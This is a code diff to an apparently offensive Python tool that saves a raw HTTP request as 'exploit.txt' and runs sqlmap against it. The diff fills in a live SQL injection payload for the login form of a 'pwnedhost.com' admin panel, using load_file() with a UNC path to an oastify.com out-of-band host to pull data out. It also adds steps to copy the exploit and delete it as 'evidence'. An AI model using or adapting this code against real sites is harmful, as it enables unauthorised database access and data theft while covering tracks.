@@ -10,7 +10,7 @@ init(autoreset=True)
 
 def create_exploit_file():
     # --- IMPORTANT ---
-    # Paste your complete raw HTTP POST request here,
+    # Paste your complete raw HTTP POST or GET request here,
     # including method, headers, a blank line, and body exactly as needed.
     # Example:
     # POST /vulnerable/path HTTP/1.1
@@ -18,7 +18,29 @@ def create_exploit_file():
     # Content-Type: application/x-www-form-urlencoded
     #
     # param1=value1&param2=value2
-    payload = """Your_POST_Request_here!"""
+    payload = """POST /barbarbaba/panel/ HTTP/1.1
+Host: pwnedhost.com
+Cache-Control: max-age=0
+Sec-CH-UA: "Chromium";v="138", "Not;A=Brand";v="24", "Google Chrome";v="138"
+Sec-CH-UA-Mobile: ?0
+Sec-CH-UA-Platform: "Windows"
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Cookie: PHPSESSID=p9m0ggi1the035ksvm7elm4q4l
+Origin: https://pwnedhost.com
+Upgrade-Insecure-Requests: 1
+Referer: https://pwnedhost.com/barbarbaba/panel/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 78
+
+username=mayurik'%2b(select%20load_file('%5c%5c%5c%5cn2qpw9b8p3e5jt1re0zo8nmg1772vtxhokccz2nr.oastify.com%5c%5cpwu'))%2b'&password=rootadmin&g-recaptcha-response=mayurik&login=Sign+In"""  # <-- Replace this whole string with your real HTTP request
 
     if payload.strip() == "" or payload.strip() == "Your_POST_Request_here!":
         print(Fore.RED + "❌ ERROR: You must replace the placeholder payload with your actual POST or GET request before running.")
@@ -28,6 +50,14 @@ def create_exploit_file():
         with open("exploit.txt", "w") as f:
             f.write(payload)
         print(Fore.CYAN + "✅ PoC exploit written to 'exploit.txt'")
+        # Also copy to modules directory
+        modules_dir = "modules"
+        if os.path.exists(modules_dir) and os.path.isdir(modules_dir):
+            with open(os.path.join(modules_dir, "exploit.txt"), "w") as f_mod:
+                f_mod.write(payload)
+            print(Fore.CYAN + f"✅ PoC exploit also copied to '{modules_dir}/exploit.txt'")
+        else:
+            print(Fore.YELLOW + f"⚠️ Modules directory '{modules_dir}' not found; skipping copy.")
     except Exception as e:
         print(Fore.RED + f"❌ Error writing file: {e}")
         sys.exit(1)
@@ -42,6 +72,10 @@ def run_sqlmap():
     sqlmap_path = 'D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py'  # Change if needed
     exploit_file = os.path.abspath("exploit.txt")
 
+    if not os.path.exists(exploit_file):
+        print(Fore.RED + f"❌ exploit.txt not found at {exploit_file}. Please generate it first (option 1).")
+        return
+
     cmd = (
         f'python "{sqlmap_path}" -r "{exploit_file}" -p "{param}" '
         '--tamper=space2comment '
@@ -55,13 +89,17 @@ def run_sqlmap():
     os.system(cmd)
 
 def clean_up():
-    try:
-        os.remove("exploit.txt")
-        print(Fore.CYAN + "🧹 'exploit.txt' has been deleted.")
-    except FileNotFoundError:
-        print(Fore.YELLOW + "⚠️ Nothing to clean — file already deleted.")
-    except Exception as e:
-        print(Fore.RED + f"❌ Failed to delete file: {e}")
+    deleted_any = False
+    for path in ["exploit.txt", os.path.join("modules", "exploit.txt")]:
+        try:
+            if os.path.exists(path):
+                os.remove(path)
+                print(Fore.CYAN + f"🧹 '{path}' has been deleted.")
+                deleted_any = True
+        except Exception as e:
+            print(Fore.RED + f"❌ Failed to delete '{path}': {e}")
+    if not deleted_any:
+        print(Fore.YELLOW + "⚠️ Nothing to clean — no exploit.txt files found.")
 
 def run_module(path):
     if os.path.exists(path):
@@ -75,7 +113,7 @@ def display_menu():
     print("2. Start SQLi with sqlmap")
     print("3. Start G0BurpSQLmaPIURLi (module)")
     print("3.1 Start G0BurpSQLmaPIUser-Agent (module)")
-    print("4. Clean evidence (delete exploit.txt)")
+    print("4. Clean evidence (delete exploit.txt files)")
     print("5. Exit" + Style.RESET_ALL)
 
 def main():
